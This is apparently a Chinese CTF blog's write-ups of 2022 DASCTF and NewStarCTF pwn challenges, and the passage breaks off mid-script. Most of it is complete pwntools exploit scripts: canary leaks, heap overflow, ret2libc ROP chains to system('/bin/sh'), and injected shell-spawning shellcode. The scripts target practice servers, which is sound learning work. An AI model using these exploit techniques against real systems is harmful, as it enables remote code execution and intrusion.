    <title>DASCTF NOV X联合出题人2022年度积分榜争夺赛pwn</title>
    <link href="/2022/11/28/2022DAS11/"/>
    <url>/2022/11/28/2022DAS11/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>这周比赛和安洵的冲突了，菜鸡做了个签到题，后续题目来复现下</p><p><img src="/2022/11/28/2022DAS11/1.png" alt="1"></p><h2 id="签个到">签个到</h2><p>首先一开始我们数9个char覆盖canary最后两个位能把canary泄露</p><p><img src="/2022/11/28/2022DAS11/3.png" alt="3"></p><p>其次，漏洞存在于输入函数里，如果我们的size输入为0的话-1就是一个极大值,可以堆溢出</p><p><img src="/2022/11/28/2022DAS11/2.png" alt="2"></p><p>正常读写的话第二个<code>strncmp</code>是满足不了的,因为低四字节固定为<code>0x00000886</code></p><p>可以堆溢出改下一个堆的fd为canary即可</p><p><img src="/2022/11/28/2022DAS11/4.png" alt="4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn_5&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27791</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sea(<span class="hljs-string">&quot;who are u?\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<br>canary=uu64(rc(<span class="hljs-number">7</span>))*<span class="hljs-number">2</span>**<span class="hljs-number">8</span><br>info(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br>low_canary=canary&amp;<span class="hljs-number">0xffffffff</span><br>sl(<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;power length: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x0</span>))<br>sla(<span class="hljs-string">&quot;name: &quot;</span>,p64(canary)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x20d51</span>)+p64(canary))<br>sl(<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;power length: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;name: &quot;</span>,p64(canary))<br>sl(<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&quot;data: &quot;</span>,p64(canary))<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="heapmaster-不会">heapmaster(不会)</h2><p>libc2.31 ，保护全开，开启了沙盒能用orw，mprotect。</p><p>每种功能有次数限制add6次，delete4次,show4次,edit4次，第一次add能申请0x510,后续add只能0x20，且index为0，1时会附带分配0x20,指针数组只维护index 0，1的ptr和size</p><p>delete功能存在uaf，只对0，1 index有效。</p><p>我们能很轻易的利用uaf和show来泄露libc_base和heap_base。</p><p>可以想到的大致流程：如果能任意地址写任意值，那我们分配到free_hook，写入setcontext，执行orw读取flag</p><p>问题是我如果用tcache doublefree接tcache poison，虽然能分配到free_hook,但因为指针数组只维护index 0，1的堆,我没法往free_hook里写值。或者如果能有什么办法控制指针数组也能解题。但我确实不会，小记一下,以后还是不复现这种没wp的题，不会就没法了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,data</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    sea(<span class="hljs-string">&quot;Data: &quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------</span><br>add(<span class="hljs-number">0x500</span>)<span class="hljs-comment">#0  </span><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)      <br>ru(<span class="hljs-string">&quot;Data is : &quot;</span>)<br>main_arena_96=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])<br>libc_base=main_arena_96-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>malloc_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x12a0</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><br>delete(<span class="hljs-number">1</span>)<br><br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022NewStarCTF PWN</title>
    <link href="/2022/11/16/newstarctf2022/"/>
    <url>/2022/11/16/newstarctf2022/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>今年9~10月的比赛，题目从易到难,知识面广，还是很不错的，主要最近不太想学kernel pwn，有空就来复现一下这比赛的pwn</p><h2 id="WEEK1">WEEK1</h2><h3 id="ret2text：">ret2text：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25509)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br>pop_rdi=<span class="hljs-number">0x4007d3</span><br>backdoor=<span class="hljs-number">0x400708</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="calc：">calc：</h3><p>用python的eval函数自动计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./cala&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25712</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    ru(<span class="hljs-string">&#x27;What\&#x27;s the answer? &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(r.recvuntil(<span class="hljs-string">&#x27;=&#x27;</span>,drop=<span class="hljs-literal">True</span>).replace(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>))))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2libc：">ret2libc：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29708</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------</span><br>pop_rdi=<span class="hljs-number">0x400753</span><br>ret=<span class="hljs-number">0x40050e</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>sla(<span class="hljs-string">&#x27;Glad to meet you again!What u bring to me this time?\n&#x27;</span>,payload)<br>got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x1b45bd</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>sla(<span class="hljs-string">&#x27;Glad to meet you again!What u bring to me this time?\n&#x27;</span>,payload)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2shellcode：">ret2shellcode：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./shell&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25903</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br><span class="hljs-comment">#-----------------------------</span><br>sla(<span class="hljs-string">&#x27;Hello my friend.Any gift for me?\n&#x27;</span>,asm(shellcraft.sh()))<br>sla(<span class="hljs-string">&#x27;Anything else?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x233000</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="fallw1nd’s-gift：">fallw1nd’s gift：</h3><p>GOT Hijacking，</p><p>gdb调试来确定该怎样输入addr</p><p>用objdump -d -M inte ./fallw1nd’s gift 取找puts的plt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./fallw1nd_gift&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25419</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------</span><br>ru(<span class="hljs-string">&#x27;gift as reward:\n&#x27;</span>)<br>puts_got=<span class="hljs-built_in">eval</span>(rc(<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_got)<br>base=puts_got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>puts_plt=base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;now input your addr:\n&#x27;</span>,<span 